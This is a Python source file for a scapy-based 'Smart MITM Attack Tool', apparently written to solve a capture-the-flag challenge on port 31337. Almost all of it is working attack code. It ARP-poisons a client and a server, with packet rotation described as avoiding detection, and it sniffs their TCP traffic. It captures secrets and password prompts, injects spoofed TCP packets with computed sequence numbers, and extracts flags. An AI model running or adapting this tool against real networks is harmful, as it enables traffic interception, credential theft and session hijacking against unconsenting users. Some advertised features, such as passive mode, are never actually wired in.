#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import threading
import os
import argparse
import logging
from typing import Optional, Dict, Tuple
import hashlib
import json
from dataclasses import dataclass

@dataclass
class TargetInfo:
    ip: str
    mac: str
    hostname: str = ""

class SmartMitm:
    def __init__(self, client_ip: str, server_ip: str, target_port: int = 31337, interface: str = "eth0"):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.target_port = target_port
        self.interface = interface
        
        # Auto-detect MAC addresses if not provided
        self.attacker_mac = scapy.get_if_hwaddr(interface)
        self.client_mac = self._resolve_mac(client_ip)
        self.server_mac = self._resolve_mac(server_ip)
        
        # Session tracking
        self.sessions: Dict[Tuple, Dict] = {}
        self.current_secret = None
        self.injection_points = {}
        
        # Configuration
        self.auto_detect_patterns = True
        self.passive_mode = False
        self.max_packet_cache = 1000
        
        # Statistics
        self.stats = {
            'packets_processed': 0,
            'sessions_tracked': 0,
            'injections_made': 0,
            'secrets_captured': 0
        }
        
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('mitm_attack.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def _resolve_mac(self, ip: str) -> str:
        """Intelligently resolve MAC address using multiple methods"""
        try:
            # Method 1: ARP cache
            result = os.popen(f"arp -n {ip}").read()
            if ":" in result:
                for line in result.split('\n'):
                    if ip in line:
                        return line.split()[2]
            
            # Method 2: ARP request
            self.logger.info(f"Resolving MAC for {ip}...")
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            answered = scapy.srp(broadcast/arp_request, timeout=2, verbose=False)[0]
            
            if answered:
                return answered[0][1].hwsrc
                
        except Exception as e:
            self.logger.warning(f"Could not resolve MAC for {ip}: {e}")
        
        raise Exception(f"Could not resolve MAC address for {ip}")
    
    def arp_spoof(self, stop_event: threading.Event):
        """Enhanced ARP spoofing with persistence and detection evasion"""
        self.logger.info("Starting intelligent ARP spoofing...")
        
        client_poison = scapy.Ether(dst=self.client_mac, src=self.attacker_mac) / scapy.ARP(
            op=2, psrc=self.server_ip, hwsrc=self.attacker_mac, pdst=self.client_ip
        )
        
        server_poison = scapy.Ether(dst=self.server_mac, src=self.attacker_mac) / scapy.ARP(
            op=2, psrc=self.client_ip, hwsrc=self.attacker_mac, pdst=self.server_ip
        )
        
        # Gratuitous ARP to update switch tables
        grat_arp = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(
            op=2, psrc=self.client_ip, hwsrc=self.attacker_mac, pdst="0.0.0.0"
        )
        
        packet_rotation = [client_poison, server_poison, grat_arp]
        rotation_index = 0
        
        try:
            while not stop_event.is_set():
                # Rotate packets to avoid pattern detection
                current_packet = packet_rotation[rotation_index]
                scapy.sendp(current_packet, verbose=0, iface=self.interface)
                
                rotation_index = (rotation_index + 1) % len(packet_rotation)
                time.sleep(0.3)  # Variable timing
                
        except Exception as e:
            self.logger.error(f"ARP spoofing error: {e}")
    
    def detect_protocol_patterns(self, packet) -> Optional[str]:
        """Auto-detect protocol patterns for smarter injection"""
        if not packet.haslayer(scapy.Raw):
            return None
            
        payload = packet[scapy.Raw].load
        
        # Common protocol patterns
        patterns = {
            'http': [b'GET', b'POST', b'HTTP'],
            'ssl_tls': [b'\x16\x03', b'\x17\x03'],  # TLS headers
            'ssh': [b'SSH-'],
            'custom_auth': [b'secret:', b'password:', b'auth:', b'login:']
        }
        
        for proto, pattern_list in patterns.items():
            for pattern in pattern_list:
                if pattern in payload:
                    self.logger.info(f"Detected {proto.upper()} pattern: {pattern}")
                    return proto
        return None
    
    def calculate_injection_point(self, packet, session_key: Tuple) -> bool:
        """Smart calculation of where to inject based on protocol analysis"""
        if not packet.haslayer(scapy.Raw):
            return False
            
        payload = packet[scapy.Raw].load
        
        # Look for secret exchange patterns
        secret_patterns = [b'secret: ', b'password: ', b'authentication: ']
        for pattern in secret_patterns:
            if pattern in payload.lower():
                self.logger.info(f"Found secret prompt pattern: {pattern}")
                return True
                
        # Hex secret detection (32-byte hex strings)
        try:
            stripped = payload.strip()
            if len(stripped) == 64:  # 32 bytes in hex
                secret_bytes = bytes.fromhex(stripped.decode())
                if len(secret_bytes) == 32:
                    self.current_secret = stripped.decode()
                    self.stats['secrets_captured'] += 1
                    self.logger.info(f"Captured valid secret: {self.current_secret}")
                    return True
        except (ValueError, UnicodeDecodeError):
            pass
            
        return False
    
    def craft_intelligent_payload(self, protocol: str, original_payload: bytes) -> bytes:
        """Craft context-aware injection payloads"""
        if protocol == 'custom_auth':
            return b"flag\n"  # Simple command injection
            
        elif protocol == 'http':
            return b"GET /flag HTTP/1.1\r\nHost: " + self.server_ip.encode() + b"\r\n\r\n"
            
        # Default to simple command
        return b"flag"
    
    def handle_packet(self, packet):
        """Enhanced packet handling with session tracking"""
        self.stats['packets_processed'] += 1
        
        if not (packet.haslayer(scapy.IP) and packet.haslayer(scapy.TCP)):
            return
            
        ip = packet[scapy.IP]
        tcp = packet[scapy.TCP]
        
        # Filter for our target traffic
        if not ((ip.src in [self.client_ip, self.server_ip] and 
                ip.dst in [self.client_ip, self.server_ip]) and
                (tcp.sport == self.target_port or tcp.dport == self.target_port)):
            return
        
        # Session tracking
        session_key = (ip.src, ip.dst, tcp.sport, tcp.dport)
        if session_key not in self.sessions:
            self.sessions[session_key] = {
                'seq': tcp.seq,
                'ack': tcp.ack,
                'protocol': None,
                'state': 'established'
            }
            self.stats['sessions_tracked'] += 1
            self.logger.info(f"New session tracked: {session_key}")
        
        # Protocol detection
        if self.auto_detect_patterns and not self.sessions[session_key]['protocol']:
            protocol = self.detect_protocol_patterns(packet)
            if protocol:
                self.sessions[session_key]['protocol'] = protocol
        
        # Check for injection opportunities
        if (ip.src == self.client_ip and ip.dst == self.server_ip and 
            packet.haslayer(scapy.Raw) and self.current_secret is None):
            
            if self.calculate_injection_point(packet, session_key):
                self.perform_smart_injection(packet, session_key)
        
        # Flag detection
        if (ip.src == self.server_ip and ip.dst == self.client_ip and 
            packet.haslayer(scapy.Raw)):
            
            payload = packet[scapy.Raw].load
            if b'flag{' in payload or b'FLAG{' in payload:
                flag = self.extract_flag(payload)
                self.logger.info(f"🎯 FLAG CAPTURED: {flag}")
                return True
        
        # Forward packet (transparent proxy)
        self.forward_packet(packet)
        return False
    
    def perform_smart_injection(self, packet, session_key: Tuple):
        """Perform intelligent packet injection with proper sequencing"""
        try:
            session = self.sessions[session_key]
            protocol = session.get('protocol', 'unknown')
            
            # Calculate next sequence number
            payload_len = len(packet[scapy.Raw].load) if packet.haslayer(scapy.Raw) else 0
            next_seq = packet[scapy.TCP].seq + payload_len
            
            # Craft context-aware payload
            original_payload = packet[scapy.Raw].load if packet.haslayer(scapy.Raw) else b""
            injection_payload = self.craft_intelligent_payload(protocol, original_payload)
            
            # Create injection packet
            ip_layer = scapy.IP(src=self.client_ip, dst=self.server_ip)
            tcp_layer = scapy.TCP(
                sport=packet[scapy.TCP].sport,
                dport=self.target_port,
                seq=next_seq,
                ack=packet[scapy.TCP].ack,
                flags="PA"
            )
            
            injection_packet = (scapy.Ether(src=self.attacker_mac, dst=self.server_mac) / 
                              ip_layer / tcp_layer / injection_payload)
            
            # Send injection
            scapy.sendp(injection_packet, verbose=0, iface=self.interface)
            self.stats['injections_made'] += 1
            self.logger.info(f"Injected {protocol} payload: {injection_payload}")
            
        except Exception as e:
            self.logger.error(f"Injection failed: {e}")
    
    def extract_flag(self, payload: bytes) -> str:
        """Extract flag using multiple pattern matching"""
        import re
        
        # Multiple flag patterns
        patterns = [
            rb'flag\{[^}]+\}',
            rb'FLAG\{[^}]+\}',
            rb'ctf\{[^}]+\}',
            rb'CTF\{[^}]+\}',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, payload)
            if match:
                return match.group().decode()
        
        # Fallback: return first 100 chars
        return payload[:100].decode(errors='ignore')
    
    def forward_packet(self, packet):
        """Intelligent packet forwarding with state tracking"""
        try:
            if packet[scapy.IP].src == self.client_ip and packet[scapy.IP].dst == self.server_ip:
                forward_pkt = scapy.Ether(src=self.attacker_mac, dst=self.server_mac) / packet[scapy.IP]
                scapy.sendp(forward_pkt, verbose=0, iface=self.interface)
            elif packet[scapy.IP].src == self.server_ip and packet[scapy.IP].dst == self.client_ip:
                forward_pkt = scapy.Ether(src=self.attacker_mac, dst=self.client_mac) / packet[scapy.IP]
                scapy.sendp(forward_pkt, verbose=0, iface=self.interface)
        except Exception as e:
            self.logger.debug(f"Forwarding error: {e}")
    
    def restore_arp_tables(self):
        """Enhanced ARP table restoration"""
        self.logger.info("Restoring ARP tables...")
        
        restoration_packets = [
            # Restore client ARP table
            scapy.Ether(dst=self.client_mac, src=self.attacker_mac) / scapy.ARP(
                op=2, psrc=self.server_ip, hwsrc=self.server_mac, pdst=self.client_ip
            ),
            # Restore server ARP table  
            scapy.Ether(dst=self.server_mac, src=self.attacker_mac) / scapy.ARP(
                op=2, psrc=self.client_ip, hwsrc=self.client_mac, pdst=self.server_ip
            ),
            # Broadcast restoration
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(
                op=2, psrc=self.client_ip, hwsrc=self.client_mac, pdst="0.0.0.0"
            )
        ]
        
        for packet in restoration_packets * 3:  # Send multiple times
            scapy.sendp(packet, verbose=0, iface=self.interface)
            time.sleep(0.1)
    
    def print_stats(self):
        """Print attack statistics"""
        self.logger.info("Attack Statistics:")
        for key, value in self.stats.items():
            self.logger.info(f"  {key}: {value}")
        self.logger.info(f"  Active sessions: {len(self.sessions)}")

def main():
    parser = argparse.ArgumentParser(description="Smart MITM Attack Tool")
    parser.add_argument("client_ip", help="Client IP address")
    parser.add_argument("server_ip", help="Server IP address") 
    parser.add_argument("-p", "--port", type=int, default=31337, help="Target port")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--passive", action="store_true", help="Passive mode (no injection)")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Please run with sudo.")
        sys.exit(1)
    
    # Initialize smart MITM
    mitm = SmartMitm(
        client_ip=args.client_ip,
        server_ip=args.server_ip,
        target_port=args.port,
        interface=args.interface
    )
    
    if args.passive:
        mitm.passive_mode = True
        mitm.logger.info("Running in passive mode")
    
    stop_event = threading.Event()
    
    try:
        # Start ARP spoofing
        arp_thread = threading.Thread(target=mitm.arp_spoof, args=(stop_event,), daemon=True)
        arp_thread.start()
        
        mitm.logger.info("Smart MITM attack started")
        mitm.logger.info(f"Client: {args.client_ip} ({mitm.client_mac})")
        mitm.logger.info(f"Server: {args.server_ip} ({mitm.server_mac})")
        mitm.logger.info(f"Target port: {args.port}")
        
        time.sleep(2)  # Let ARP spoofing establish
        
        # Start packet processing
        bpf_filter = f"tcp port {args.port} and (host {args.client_ip} or host {args.server_ip})"
        
        def stop_sniffing(packet):
            return stop_event.is_set()
        
        mitm.logger.info("Starting intelligent packet analysis...")
        scapy.sniff(
            filter=bpf_filter, 
            prn=mitm.handle_packet, 
            store=0, 
            iface=args.interface, 
            stop_filter=stop_sniffing
        )
        
    except KeyboardInterrupt:
        mitm.logger.info("Attack interrupted by user")
    except Exception as e:
        mitm.logger.error(f"Attack error: {e}")
    finally:
        stop_event.set()
        mitm.restore_arp_tables()
        mitm.print_stats()
        mitm.logger.info("Smart MITM attack completed")

if __name__ == "__main__":
    main()
